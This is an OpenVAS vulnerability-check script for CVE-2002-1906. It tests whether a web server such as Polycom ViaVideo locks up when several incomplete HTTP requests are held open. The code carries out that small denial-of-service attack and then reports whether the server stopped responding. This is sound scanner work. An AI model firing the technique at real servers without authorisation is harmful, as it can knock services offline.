###############################################################################
# OpenVAS Vulnerability Test
# $Id: incomplete_http_requests_DoS.nasl 4797 2016-12-17 14:04:59Z cfi $
#
# Polycom ViaVideo denial of service
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2003 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

########################
# References:
########################
#
# Date:    Mon, 14 Oct 2002 08:27:54 +1300 (NZDT)
# From:    advisory@prophecy.net.nz
# To:      bugtraq@securityfocus.com
# Subject: Security vulnerabilities in Polycom ViaVideo Web component
#
########################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11825");
  script_version("$Revision: 4797 $");
  script_tag(name:"last_modification", value:"$Date: 2016-12-17 15:04:59 +0100 (Sat, 17 Dec 2016) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_cve_id("CVE-2002-1906");
  script_bugtraq_id(5962);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("Polycom ViaVideo denial of service");
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2003 Michel Arboi");
  script_family("Denial of Service");
  script_dependencies('http_version.nasl', 'httpver.nasl', 'www_multiple_get.nasl');
  script_require_ports("Services/www",80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  tag_solution = "Contact your vendor for a patch; Upgrade your web server";

  tag_summary = "The remote web server locks up when several incomplete web
  requests are sent and the connections are kept open.";

  tag_insight = "Some servers (e.g. Polycom ViaVideo) even run an endless loop,
  using much CPU on the machine. OpenVAS has no way to test this,
  but you'd better check your machine.";

  script_tag(name:"summary", value:tag_summary);
  script_tag(name:"solution", value:tag_solution);
  script_tag(name:"insight", value:tag_insight);

  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include('global_settings.inc');
include("http_func.inc");

port = get_http_port( default:80 );

if( http_is_dead( port:port, retry:4 ) ) exit( 0 );

# 4 is enough for Polycom ViaVideo
# Try to avoid FP on CISCO 7940 phone
max = get_kb_item( 'www/multiple_get/' + port );
if( max ) {
  imax = max * 2 / 3;
  if( imax < 1 ) {
    imax = 1;
  } else if( imax > 5 ) {
    imax = 5;
  }
} else {
  imax = 5;
}

n = 0;
for( i = 0; i < imax; i++ ) {
  soc[i] = http_open_socket( port );
  if( soc[i] ) {
    n ++;
    req = http_get( item:"/", port:port );
    req -= '\r\n';
    send( socket:soc[i], data:req );
  }
}

debug_print(n, ' connections on ', imax, ' were opened\n');

dead = 0;
if( http_is_dead( port:port, retry:1 ) ) dead++;

for( i = 0; i < imax; i++ ) {
  if( soc[i] ) http_close_socket( soc[i] );
}

if( http_is_dead( port:port, retry:1 ) ) dead++;

if( dead == 2 ) {
  security_message( port:port );
  exit( 0 );
} else if( dead == 1 ) {
  report = "The remote web server locks up when several incomplete web
  requests are sent and the connections are kept open.

  However, it runs again when the connections are closed.";

  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
